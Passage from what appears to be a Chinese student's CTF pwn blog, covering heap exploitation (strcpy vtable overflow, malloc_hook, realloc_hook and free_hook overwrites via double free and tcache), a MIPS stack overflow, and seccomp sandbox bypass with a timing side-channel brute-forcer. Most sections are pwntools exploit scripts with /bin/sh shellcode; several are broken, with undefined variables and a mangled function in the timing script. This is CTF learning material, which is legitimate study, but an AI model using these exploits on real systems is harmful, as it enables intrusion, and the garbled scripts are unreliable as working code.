+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064690-3462c9a7-3cbb-46bc-94f8-676b3826d346.png"></p>
+<p>看一看别的部分</p>
+<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/DLs2wG4YgiBdDZkISqMcx0cQn8g">Strcpy 是一个危险的函数</a>。</p>
+<p>看到这个std这，它使用了一个strcpy函数。可以进行堆溢出</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064737-2cc9dcdb-4add-4f32-baa7-387ef7cea763.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064758-9b2c0628-caf7-4453-be64-b29ebfdeaf77.png"></p>
+<p>那就是用这个函数来一个堆溢出，然后覆盖掉。用虚表指针指向shellcode执行bin&#x2F;sh就行</p>
+<p>最后要调一下listen函数调用一下vptr指针。</p>
+<pre><code class="language-plain">from pwn import *
+context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)
+p=process(&quot;./garden&quot;)
+elf=ELF(&#39;./garden&#39;)
+
+shellcode = asm(&#39;&#39;&#39;
+    xor    rax, rax        
+    push   rax             
+    push   0x68732F2F      
+    push   0x6E69622F      
+    mov    rdi, rsp        
+    xor    rsi, rsi        
+    xor    rdx, rdx        
+    mov    al, 0x3B        
+    syscall                
+&#39;&#39;&#39;)
+
+def add(name,weight):
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(&quot;1&quot;)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(name)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(weight))
+    
+def remove(idx):
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(&quot;5&quot;)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(idx))
+    
+bss=0x605420
+p.recvuntil(&quot;:&quot;)
+p.sendline(b&#39;a&#39;*8+p64(name+8)+shellcode)
+
+add(b&#39;A&#39;*8,0)
+add(b&#39;B&#39;*8,1)
+    
+remove(0)
+
+fake_ptr=name+8
+add(b&#39;a&#39;*72+p64(fake_ptr),2)
+
+p.recvuntil(&quot;:&quot;)
+p.sendline(&quot;3&quot;)
+p.recvuntil(&quot;:&quot;)
+p.sendline(b&#39;0&#39;)
+
+p.interactive()
+</code></pre>
+<h1 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="realloc_hook"></a>realloc_hook</h1><p>realloc_hook 用free_hook写的。用realloc_hook的话libc泄露前面应该是一样的</p>
+<p>泄露libc之后的通过tcache_攻击让malloc指到realloc_hook-0x10这个地方的chunk</p>
+<p>继续把这个chunk改成system。最后有bin&#x2F;sh的chunk调用realloc。触发bin&#x2F;sh</p>
+<pre><code class="language-plain">realloc_hook = libc_base + libc.sym[&#39;__realloc_hook&#39;]
+system_addr  = libc_base + libc.sym[&#39;system&#39;]
+
+#tcache_realloc_hook
+delete(1)
+payload = b&#39;A&#39;*0x68 + p64(0x71) + p64(realloc_hook - 0x10)
+edit(0, 0x78, payload)
+add(3, 0x60)
+add(4, 0x60)
+
+edit(4, 0x8, p64(system_addr))
+
+add(5, 0x20)
+edit(5, 0x8, b&#39;/bin/sh\x00&#39;)
+choice(3)
+io.recvuntil(b&#39;Sanctum for arcane inscription:\n&#39;)
+io.sendline(b&#39;5&#39;)
+io.recvuntil(b&#39;Runic sequence length:\n&#39;)
+io.sendline(b&#39;0x30&#39;)  
+io.interactive()
+</code></pre>
+<h1 id="EZ3"><a href="#EZ3" class="headerlink" title="EZ3"></a>EZ3</h1><p>ida没有mips的编译，照着添加了之后只能在终端里输出。下了一个新的ghidra直接看</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531065255-36b2f3f9-c5a6-4a55-be1c-0f00304ad0a5.png"></p>
+<p>ida这个终端输出的不知道是什么。直接用ghidra看吧。main函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531065575-28a04e17-6336-4f6b-aa14-05380fe78d21.png"></p>
+<p>分析以后是栈溢出。有后门，用栈溢出的方法来做</p>
+<p>mips是一种新的汇编，要先学习一下对应的指令。</p>
+<p>看一下指令集<a target="_blank" rel="noopener" href="https://www.tarikvon.cn/2024/05/25/MIPS/">https://www.tarikvon.cn/2024/05/25/MIPS/</a></p>
+<pre><code class="language-plain">from pwn import *
+context(os = &#39;linux&#39;, arch = &#39;mips&#39;, log_level = &#39;debug&#39;)
+io = process([&quot;qemu-mipsel&quot;, &quot;-L&quot;, &quot;/usr/mipsel-linux-gnu&quot;, &quot;./EZ3.0&quot;])
+elf = ELF(&quot;./EZ3.0&quot;)
+
+binsh = 0x0411010
+lw = 0x00400a20
+system_addr = 0x00400B70 
+
+payload = b&#39;a&#39; * 36
+payload += p32(lw)
+payload += p32(0)
+payload += p32(system_addr)
+payload += p32(binsh_cat)
+io.sendafter(&quot;&gt;&quot;, payload)
+io.interactive()
+</code></pre>
+<h1 id="（七月第四周）"><a href="#（七月第四周）" class="headerlink" title="（七月第四周）"></a>（七月第四周）</h1><h1 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h1><p>看一下</p>
+<p>main函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101946-163e5d87-5f7b-41bd-bd45-691c0dcc6d17.png"></p>
+<p>欢迎，菜单函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101895-b9d977e6-196e-486f-8c32-0fad3a5d2e90.png"></p>
+<p>free函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101973-df7c30fb-7417-4d7c-bc68-508057e27192.png"></p>
+<p>add函数。好像只能最多加16个。大小是大于0x0小于0x128的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101903-a3a7b507-6dcc-423f-88be-b49dc8becc7e.png"></p>
+<p>有一个change_name函数。它可以往bss上读数据。可以读0xd0。可以打印对应的bss数据</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101968-29d29a98-bcf8-44c2-b8b0-f18f8e857bf6.png"></p>
+<p>用change_name来打印libc。覆盖到malloc_hook。在这之前先把malloc函数改成bin&#x2F;sh或者onegadget。</p>
+<p>要泄露libc的话这是用的unsorted bin attarct。在bss上构造一个假的堆。感觉跟栈迁移有点像。</p>
+<p>劫持返回地址用double free。先来一次double free把地址改到bss。</p>
+<p>再在bss上伪造大堆，让它free掉进入unsorted bin 。再溢出假的堆。一直覆盖到跟main arana连的指针用change name函数打印出来libc</p>
+<p>之后就是再double free一遍。把地址改到hook这。用libc算一下onegadget的地址。hook改成onegadget的。发送数据调用hook就能执行onegadget了</p>
+<p>wp里面debug这一段不知道是干啥的</p>
+<pre><code class="language-plain">def dbg():
+    gdb.attach(io)
+io.recv()
+payload = p64(0) + p64(0x7F)
+payload = payload.ljust(0x70, b&quot;\x00&quot;)
+payload += p64(0x7F)
+io.sendline(payload)
+</code></pre>
+<pre><code class="language-plain">#假的堆的情况
+偏移 0x00: 0x0000000000000000  ← prev_size
+偏移 0x08: 0x0000000000000091  ← size (0x90字节 + prev_inuse标志)
+偏移 0x10-0x97: &quot;aaaa...&quot;      ← 填充数据
+偏移 0x98: 0x0000000000000021  ← 伪造的下一个chunk的size
+偏移 0xa0: 0x0000000000000000  ← 伪造的prev_size
+偏移 0xa8: 0x0000000000000000  ← 伪造的fd
+偏移 0xb0: 0x0000000000000000  ← 伪造的bk  
+偏移 0xb8: 0x0000000000000021  ← 再下一个chunk的size
+</code></pre>
+<pre><code class="language-plain">from pwn import *
+context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)
+io = process(&#39;./malloc&#39;)
+elf = ELF(&quot;./malloc&quot;)
+libc = ELF(&quot;libc.so.6&quot;)
+
+def dbg():
+    gdb.attach(io)
+#io.recv()
+#payload = p64(0) + p64(0x7F)
+#payload = payload.ljust(0x70, b&quot;\x00&quot;)
+#payload += p64(0x7F)
+#io.sendline(payload)
+
+def add(size, content):
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline(str(1))
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline(str(size))
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline(content)
+def free(idx):
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline(str(2))
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline(str(idx))
+def change(con):
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline(str(3))
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline()
+    
+add(0x60, b&quot;a&quot;)  # 0
+add(0x60, b&quot;a&quot;)  # 1
+add(0x60, b&quot;a&quot;)  # 2
+free(0)
+free(1)
+free(0)
+add(0x60, p64(0x6020c0))  # 3
+add(0x60, b&quot;a&quot;)  # 4
+add(0x60, b&quot;a&quot;)  # 5
+add(0x60, b&quot;a&quot;)  # 6
+
+payload = p64(0) + p64(0x91)
+payload = payload.ljust(0x98, b&quot;a&quot;)
+payload += p64(0x21) + p64(0) * 3 + p64(0x21)
+change(payload)
+free(6)
+payload = b&quot;a&quot; * 0xF + p8(0x91)
+new(payload)
+libc.address = u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - 0x3C4B78
+info(&quot;libc base: &quot; + hex(libc.address))
+change(p64(0) + p64(0x21))
+
+free(1)
+free(0)
+free(1)
+add(0x60, p64(libc.sym[&quot;malloc_hook&quot;] - 0x23))  # 7
+add(0x60, b&quot;a&quot;)
+add(0x60, b&quot;a&quot;)
+add(0x60, b&quot;a&quot; * 0x13 + p64(libc.address + 0xf03a4)
+
+io.recv()
+io.sendline(str(1))
+io.recvuntil(b&quot;&gt; &quot;)
+io.sendline(str(0x60))
+io.interactive()
+</code></pre>
+<h1 id="realloc-hook-1"><a href="#realloc-hook-1" class="headerlink" title="realloc_hook"></a>realloc_hook</h1><p>main函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102509-ad99d450-8e5c-4215-987e-b1f62473ceb3.png"></p>
+<p>add函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102544-db59ed7a-3ff2-40e5-aaf9-d9080fb4c63a.png"></p>
+<p>free 指针没有置空</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102567-71f9a4c6-8f9a-4c09-a3ac-a14a011d31d0.png"></p>
+<p>有edit函数。它返回的read可以溢出</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102733-3b9caac5-e549-461f-9f7c-7791a1d3a6e7.png"></p>
+<p>可以puts的函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102703-70c5a6a8-ca2b-4794-bc1d-1b78e7a9bf1d.png"></p>
+<p>如果是高版本的glibc，可以tcache bin attack 直接覆盖掉指针。</p>
+<p>我们先uaf泄露libc，用unsorted bin 然后算出来libc的地址以后算system.因为有edit函数。我们就不用onegadget了。直接用edit把堆的内容改成system bin&#x2F;sh 然后执行就可以</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531103085-4c4ab0ee-2c49-41b0-b88a-9e8e19bb6cfd.png"></p>
+<pre><code class="language-plain">from pwn import * 
+
+context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)
+io=process(&#39;./realloc&#39;)
+libc=ELF(&#39;./libc.so.6&#39;)
+
+
+def add(idx,size):
+    p.sendlineafter(&#39;Chant your choice:&#39;,b&#39;1&#39;)
+    p.sendlineafter(&#39;Celestial alignment coordinate:&#39;,str(idx))
+    p.sendlineafter(&#39;Quantum essence required:&#39;,str(size))
+def free(idx):
+    p.sendlineafter(&#39;Chant your choice:&#39;,b&#39;2&#39;)
+    p.sendlineafter(&#39;Cursed sanctum to cleanse:&#39;,str(idx))
+def edit(idx,size,content):
+    p.sendlineafter(&#39;Chant your choice:&#39;,b&#39;3&#39;)
+    p.sendlineafter(&#39;Sanctum for arcane inscription:&#39;,str(idx))
+    p.sendlineafter(&#39;Runic sequence length:&#39;,str(size))
+    p.sendafter(&#39;Inscribe your primordial truth:&#39;,content)
+def puts(idx):
+    p.sendlineafter(&#39;Chant your choice:&#39;,b&#39;4&#39;)
+    p.sendlineafter(&#39;Sanctum to reveal cosmic truth:&#39;,str(idx))
+    
+
+add(0,0x68)
+add(1,0x68)
+add(2,0x410)
+add(3,0x68)
+
+free(2)
+puts(2)
+
+main_arena = u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))
+malloc_hook = main_arena-96-0x10
+libc_base = malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
+fake = libc_base+libc.sym[&#39;__free_hook&#39;]
+system = libc_base+libc.sym[&#39;system&#39;]
+
+free(1)
+edit(1,0x100,p64(fake))
+add(1,0x68)
+add(4,0x68)
+edit(4,0x100,p64(system))
+edit(3,0x100,p64(&#39;/bin/sh\x00&#39;))
+free(3)
+p.interactive
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/ZLF2wqKQUi2OwNkUnWVc3bILnzc">main_arena与malloc的偏移</a></p>
+<p>伪造假的堆。</p>
+<pre><code class="language-plain">add(0,0x30)
+add(1,0x30)
+add(2,0x30)
+add(3,0x430)
+add(4,0x30)
+delete(4)
+delete(3)
+
+fake_chunk = p64(0)*7+p64(0x41)+p64(0)*7+p64(0x41)+p64(0)*7+p64(0x441)
+edit(0,0x40,fake_chunk)
+add(1,0x420)
+show(1)
+p.recv(8)
+main_arena=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))-96-1024
+print(hex(main_arena))
+libc_base=main_arena-0x3ebc40
+print(hex(libc_base))
+free_hook=libc_base+libc.symbols[&#39;__free_hook&#39;]
+print(hex(free_hook))
+system_addr=libc_base+libc.symbols[&#39;system&#39;]
+delete(1)
+delete(2)
+
+fake_chunk = p64(0)*7+p64(0x41)+p64(0)*7+p64(0x41)+p64(free_hook)
+edit(0,0x100,fake_chunk)
+</code></pre>
+<p>有的偏移还不是很清楚。上面这个假堆的0x3ebc40和减的1024是什么还不知道。在libc 文件里的malloc trim函数里也没找见</p>
+<h1 id="garden-1"><a href="#garden-1" class="headerlink" title="garden"></a>garden</h1>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #00a596">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/heap/" style="color: #00bcd4">heap</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/vtable/" style="color: #00a596">vtable</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/malloc-hook/" style="color: #ffa2c4">malloc_hook</a>
+        </span>
+        
+    </div>
+    <a href="/2025/07/25/%E8%99%9A%E5%87%BD%E6%95%B0%E5%92%8Cmalloc_hook/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/07/20/%E6%B2%99%E7%AE%B1sandbox/">
+        <h2 class="post-title">沙箱 sandbox 绕过</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/7/20
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>沙箱可以这个来看开没开</p>
+<pre><code class="language-plain">seccomp-tools dump ./文件
+</code></pre>
+<p>看第四行是不是return kill 了是不是禁用了execve</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530793932-60f35642-21d7-4669-bcf9-f9fd4c395b88.png"></p>
+<p>有的里面好像也直接有sandbox</p>
+<p>里面或者也可以通过prctl函数调用，第二种是使用seccomp库</p>
+<p>shellcode写到mmap分配的空间里。能写rop的话可以写。但是感觉如果写的话一般要栈迁移一下。</p>
+<h2 id="seccomp函数调用"><a href="#seccomp函数调用" class="headerlink" title="seccomp函数调用"></a>seccomp函数调用</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530793959-5a76d33c-3803-4440-85a0-9cd25002cfb6.png"></p>
+<p>一般是这四个</p>
+<h3 id="第一个是返回地址"><a href="#第一个是返回地址" class="headerlink" title="第一个是返回地址"></a>第一个是返回地址</h3><h3 id="第二个是一个宏"><a href="#第二个是一个宏" class="headerlink" title="第二个是一个宏"></a>第二个是一个宏</h3><p>SCMP_ACT_ALLOW(0x7fff0000U)</p>
+<p>SCMP_ACT_KILL( 0x00000000U)</p>
+<p>有的不知道为啥它跟图片里写的是0LL</p>
+<p>有的写的是这个 0x7FFF0000LL</p>
+<h3 id="第三个是调用号"><a href="#第三个是调用号" class="headerlink" title="第三个是调用号"></a>第三个是调用号</h3><p>不同的有不一样的调用号</p>
+<p>read–&gt;0 write–&gt;1 open–&gt;2 exit–&gt;60</p>
+<h3 id="第四个是对它的操作"><a href="#第四个是对它的操作" class="headerlink" title="第四个是对它的操作"></a>第四个是对它的操作</h3><p>参数为0表示白名单模式</p>
+<p>参数为0x7fff0000U则为黑名单模式</p>
+<p>0的话就没有操作。0LL就是不做限制。</p>
+<h2 id="有orw"><a href="#有orw" class="headerlink" title="有orw"></a>有orw</h2><p>一种就是写shellcode。asm也行，手写也行</p>
+<p>另一种如果空间够的话或者栈迁移比较好做的话我们也可可以构造rop链来用orw.就是跟libc差不多，用基地址算出来这三个函数的地址，最后覆盖一下。</p>
+<h2 id="有or没有w"><a href="#有or没有w" class="headerlink" title="有or没有w"></a>有or没有w</h2><p>用爆破判断</p>
+<h2 id="有rw没有o"><a href="#有rw没有o" class="headerlink" title="有rw没有o"></a>有rw没有o</h2><h4 id="可以借助fstat-利用retfq汇编指令切换至32位调用open"><a href="#可以借助fstat-利用retfq汇编指令切换至32位调用open" class="headerlink" title="可以借助fstat()-&gt;利用retfq汇编指令切换至32位调用open"></a>可以借助fstat()-&gt;利用retfq汇编指令切换至32位调用open</h4><p>实际上利用了fstat这个函数</p>
+<p>和retf汇编指令</p>
+<h2 id="没有ow只有r"><a href="#没有ow只有r" class="headerlink" title="没有ow只有r"></a>没有ow只有r</h2><p>read,mmap，但是又fstat，所以可以解决没有open的情况，没有write可以利用loop循环，用cmp卡住程序，从而进行单字节爆破得到flag</p>
+<p>结合上面两个</p>
+<ul>
+<li>对于 <code>open</code>，我们可以选择使用 <code>openat</code> 或者 <code>openat2</code></li>
+<li>对于 <code>read</code>，我们可以选择使用 <code>readv</code>、<code>preadv</code>、<code>preadv2</code>，<code>pread64</code> 或者 <code>mmap</code>（本题可用）</li>
+<li>对于 <code>write</code>，我们可以选择使用 <code>writev</code>，<code>sendfile</code>等</li>
+</ul>
+<p>注意在使用 shellcraft 时需恢复 <code>rsp</code> 寄存器</p>
+<h1 id="沙箱的侧信道"><a href="#沙箱的侧信道" class="headerlink" title="沙箱的侧信道"></a>沙箱的侧信道</h1><p>当目标程序被沙箱（Sandbox）严格限制，无法直接调用 <code>execve</code> 或者关闭了标准输出，使得无法正常泄露 <code>flag</code> 明文时，通过分析程序在接收不同输入后所表现出的微观反馈（如程序崩溃、进入死循环、时间差等），从而逐位、逐字符地“盲猜”出 <code>flag</code> 内容的一种技术手段。</p>
+<p>沙箱里read open都有，没有write.这个时候我们没有办法通过row来读取打开写出flag.</p>
+<h2 id="基本的方法"><a href="#基本的方法" class="headerlink" title="基本的方法"></a>基本的方法</h2><p>一，比较</p>
+<p>1.由于read open又都存在，我们可以利用这个东西。flag会读到，也可以打开flag。</p>
+<p>2.我们可以通过尝试的方法来利用open来逐个比较flag里面每个字符(cmp)</p>
+<p>3.对了就返回exit。如果错了就继续loop循环。</p>
+<p>二.比较时间</p>
+<p>或者比较时间。因为比较之后对了和比较之后错了时间不一样。这两种方法来判断是不是试对了。</p>
+<p>就是你用shellcode的形式来调用read open 和比较（就是要用shellcode来调用那些寄存器或者执行操作之类的来绕过这个禁用掉write的特殊的沙箱）</p>
+<p> 前提条件是你能格式化字符串或者溢出。就是给shellcode机会。然后sandbox又比较特别。又是上面那种情况。就可以考虑这种，不考虑算法，来侧面利用比较正确或错误时间不同这种侧面的方式。来进行猜测flag</p>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>1.就是先初始化，</p>
+<p>2.写一段 o+r+ 比较 的shellcode,</p>
+<p>3.然后再在底下添加判断正确或错误的函数。</p>
+<p>这个是模板，单字节比对示例：</p>
+<pre><code class="language-plain">mov al, [flag_addr + offset]      ; 读取实际 Flag 字节
+mov bl, guessed_char              ; 将猜测字节载入
+cmp al, bl                        ; 比对
+jne wrong                         ; 如果不相等则跳转到 wrong
+; 相等：进入死循环或耗时路径
+jmp in_loop
+</code></pre>
+<h2 id="一道题"><a href="#一道题" class="headerlink" title="一道题"></a>一道题</h2><p>下面看一下这个litctf里的侧信道</p>
+<p>暂时无法在飞书文档外展示此内容</p>
+<p>看一下沙箱</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530793894-72310236-ef0d-412a-b416-82dc6bbbc437.png"></p>
+<p>这个标志比较明显。就没有write了。没有write的情况下我们想要绕过沙箱。就要考虑这个侧信道的方法</p>
+<p>IDA逆向一下函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530793894-6f750ceb-c07a-469e-83fb-8d9eb9e1568c.png"></p>
+<p>这的mmap是用来分配内存的。里面的34是flag.它映射了0x1000</p>
+<p>主要是这个。read读0x100，到buf，把buf当成指针。主要就是利用这个</p>
+<pre><code class="language-plain">read(0, buf, 0x100);
+((void (*)(void))buf)();
+</code></pre>
+<p>写shellcode时注意不要超0x100</p>
+<pre><code class="language-plain">from pwn import *
+import time, statistics, sys
+
+HOST = sys.argv[1] if len(sys.argv) &gt; 1 else &quot;challenge.host&quot;
+PORT = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 31337
+
+context.arch = &quot;amd64&quot;
+context.log_level = &quot;error&quot;  # change to &#39;debug&#39; for verbose I/O
+
+FLAG_ADDR = 0x404040  #  bytes:
+    &quot;&quot;&quot;Return assembled probe shellcode for flag[index] == guess.&quot;&quot;&quot;
+    asm_template = f&quot;&quot;&quot;
+        mov     rbx, &#123;FLAG_ADDR&#125;
+        add     rbx, &#123;index&#125;        ; rbx = &amp;flag[index]
+        movzx   eax, byte [rbx]     ; al  = flag[index]
+        cmp     al, &#123;guess&#125;         ; compare with guess
+        jne     wrong               ; if not equal – skip delay
+correct:
+        mov     rcx, &#123;LOOP_CNT&#125;     ; long busy-loop for timing leak
+pause:
+        dec     rcx
+        jne     pause
+wrong:
+        xor     edi, edi            ; exit(0)
+        mov     eax, 60
+        syscall
+    &quot;&quot;&quot;
+    sc = asm(asm_template)
+    assert len(sc)  float:
+    &quot;&quot;&quot;Send probe and return measured RTT in seconds (average of 3 samples).&quot;&quot;&quot;
+    samples = []
+    for _ in range(3):
+        io = remote(HOST, PORT)
+        # sync – wait for banner &amp; prompt
+        io.recvuntil(b&quot;Please input your shellcode&quot;)
+        io.recvline()  # consume trailing newline, if any
+        payload = make_probe_sc(index, guess)
+        start = time.perf_counter()
+        io.send(payload)
+        try:
+            io.shutdown(&quot;send&quot;)  # EOF -&gt; let target finish
+        except OSError:
+            pass
+        try:
+            io.clean(timeout=0.10)  # drain any leftover output quickly
+        except EOFError:
+            pass
+        elapsed = time.perf_counter() - start
+        io.close()
+        samples.append(elapsed)
+    return statistics.mean(samples)
+
+
+def brute():
+    printable = list(range(32, 127))  # space..~
+    flag = bytearray()
+    idx  = 0
+    while True:
+        base = send_probe(idx, 0)  # definitely wrong byte → baseline RTT
+        found = False
+        for g in printable:
+            t = send_probe(idx, g)
+            if t - base &gt; 0.015:   # threshold: tune if network chilliest
+                flag.append(g)
+                print(f&quot;[+] flag[&#123;idx&#125;] = &#123;chr(g)&#125; (Δ &#123;t - base:.3f&#125;s)&quot;)
+                idx  += 1
+                found = True
+                break
+        if not found:
+            break  # reached ‘&#125;’ or probe failed – stop
+    print(&quot;\n[!] FLAG =&quot;, flag.decode(errors=&quot;ignore&quot;))
+
+if __name__ == &quot;__main__&quot;:
+    brute()
+</code></pre>
+<h1 id="shellcraft-sendfile"><a href="#shellcraft-sendfile" class="headerlink" title="shellcraft.sendfile"></a>shellcraft.sendfile</h1><p>在构造 shellcode 时，<code>shellcraft.openat()</code> 方法封装了 <code>openat()</code> 系统调用，通常接受以下四个参数：</p>
+<p><code>**1.dirfd**</code><strong>（目录文件描述符）：指定路径解析的起始目录。</strong></p>
+<p><code>-100</code> 是一个特殊值，表示 <code>AT_FDCWD</code>，即当前工作目录。</p>
+<ol>
+<li>在某些情况下，<code>-100</code> 可能用于绕过沙箱限制。</li>
+</ol>
+<p><code>**2.&quot;/flag&quot;**</code>** 是目标文件的路径。**</p>
+<p><code>**3.flags**</code><strong>（打开标志）：指定文件的访问模式和行为。</strong></p>
+<p>  <code>0</code> 表示只读模式。</p>
+<p><code>**4.mode**</code><strong>（模式）：指定新文件的权限。</strong></p>
+<ol>
+<li><code>0</code> 表示不设置权限，通常在文件已存在时使用。</li>
+</ol>
+<h1 id="shellcraft-sendfile-1"><a href="#shellcraft-sendfile-1" class="headerlink" title="shellcraft.sendfile"></a>shellcraft.sendfile</h1><p>在构造 shellcode 时，<code>shellcraft.sendfile()</code> 方法封装了 <code>sendfile()</code> 系统调用，通常接受以下四个参数：</p>
+<p><code>**0.out_fd**</code><strong>（输出文件描述符）</strong>：指定数据发送的目标文件描述符。</p>
+<ul>
+<li>在攻击脚本中，<code>1</code> 表示标准输出（stdout）。</li>
+</ul>
+<ol>
+<li><code>**in_fd**</code><strong>（输入文件描述符）</strong>：指定数据来源的文件描述符。<ol>
+<li>在攻击脚本中，<code>3</code> 是之前通过 <code>openat</code> 打开的 <code>/flag</code> 文件的文件描述符。</li>
+</ol>
+</li>
+<li><code>**offset**</code><strong>（偏移量）</strong>：指定从输入文件中读取数据的起始位置。<ol>
+<li>在攻击脚本中，<code>0</code> 表示从文件的开始处读取。</li>
+</ol>
+</li>
+<li><code>**count**</code><strong>（字节数）</strong>：指定要读取的字节数。<ol>
+<li>在攻击脚本中，<code>0x100</code> 表示读取 256 字节。</li>
+</ol>
+</li>
+</ol>
+<p>通过此调用，可以将 <code>/flag</code> 文件的内容输出到标准输出，从而绕过沙箱限制，获取 flag。</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #ffa2c4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/sandbox/" style="color: #00a596">sandbox</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/seccomp/" style="color: #03a9f4">seccomp</a>
+        </span>
+        
+    </div>
+    <a href="/2025/07/20/%E6%B2%99%E7%AE%B1sandbox/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/07/15/%E5%85%B6%E5%AE%83%E7%9A%84/">
+        <h2 class="post-title">其它知识点（mmap 等）</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/7/15
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530739616-5c381643-84f3-4946-972b-66b3990f7907.png"></p>
+<p>映射的三要素：虚拟地址，物理地址，映射的大小</p>
+<p>mmap映射进程在用户里面的一个固定区域。</p>
+<p>mmap的底层操作</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530739580-158582ac-d59a-48a4-a691-75fcf3a07682.png"></p>
+<p>虚拟地址——&gt;大小——&gt;验证号</p>
+<p>相对io调用 效率变高开销变小</p>
+<p>这个mmap是linux里利用内存的一个特别方法。好像是能把程序直接映射到内存里。通过mmap.</p>
+<p>这个可以提高效率，可以</p>
+<p>传统文件 I&#x2F;O 需 4 次数据拷贝（磁盘→内核缓冲→用户缓冲→内核套接字→网卡），而 <code>mmap</code> 仅需 2 次（磁盘→内核缓冲→网卡），减少 CPU 开销</p>
+<p>文件直接到磁盘里，直接用指针访问。然后多个进程到一个文件里。通过一个“ <code>MAP_SHARED</code>”可以共享。父子进程可以通过fork实现这种功能。</p>
+<ol>
+<li>文件映射<ol>
+<li>将磁盘文件映射到进程内存中，程序通过指针直接访问文件内容，无需调用 <code>read</code>&#x2F;<code>write</code> 等 I&#x2F;O 函数</li>
+<li>修改映射内存时，系统自动将脏页回写至文件（需指定 <code>MAP_SHARED</code> 标志）</li>
+</ol>
+</li>
+<li>匿名映射<ol>
+<li>创建不与文件关联的内存区域（如 <code>MAP_ANONYMOUS</code>），常用于进程间共享数据或动态分配大内存</li>
